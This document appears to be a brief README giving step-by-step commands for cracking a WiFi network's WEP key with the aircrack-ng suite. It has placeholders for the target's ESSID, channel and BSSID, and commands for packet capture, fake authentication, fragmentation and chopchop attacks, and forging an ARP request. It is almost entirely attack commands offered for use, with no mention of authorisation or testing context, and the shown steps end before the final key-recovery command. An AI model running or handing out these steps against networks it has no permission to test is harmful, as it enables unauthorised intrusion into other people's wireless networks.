# unlock_WEP
Steps to unlock WEP key using aircrack

# Category

WiFi Security

# Requirements

Make sure to know following information.

TARGET-ESSID(WiFi_NAME) 

TARGET-CHANNEL 

TARGET-BSSID(MAC)

YOUR-BSSID(MAC)

# How to

`airodump-ng --channel 7 --bssid TARGET-BSSID(MAC) -w /var/tmp/wifidata wlan0`

`aireplay-ng -1 0 -e TARGET-ESSID(WiFi_NAME) -a TARGET-BSSID(MAC) -h YOUR-BSSID(MAC) wlan0`

`aireplay-ng -1 6000 -o 1 -q 10 -e TARGET-ESSID(WiFi_NAME) -a TARGET-BSSID(MAC) -h YOUR-BSSID(MAC) wlan0`

`aireplay-ng -5 -b TARGET-BSSID(MAC) -h YOUR-BSSID(MAC) wlan0`

`aireplay-ng -4 -h YOUR-BSSID(MAC) -b TARGET-BSSID(MAC) wlan0`

 `packetforge-ng -0 -a TARGET-BSSID(MAC) -h YOUR-BSSID(MAC) -k 255.255.255.255 -l 255.255.255.255 -y fragment-0203-180343.xor -w arp-request`
